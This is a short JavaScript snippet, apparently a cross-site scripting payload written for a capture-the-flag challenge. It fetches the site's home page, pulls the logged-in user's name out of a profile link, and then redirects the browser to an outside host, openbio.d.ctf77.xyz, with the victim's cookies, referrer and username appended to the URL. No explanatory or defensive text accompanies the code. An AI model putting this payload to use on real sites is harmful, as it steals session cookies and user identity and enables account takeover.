if (localStorage.abc !== '1') {
  $.get('/').then(a => {
    const username = a.match(/profile\/(.+)"/)[1];
    window.location = 'http://openbio.d.ctf77.xyz/redirect?' + document.cookie + document.referrer + username;
  });
}
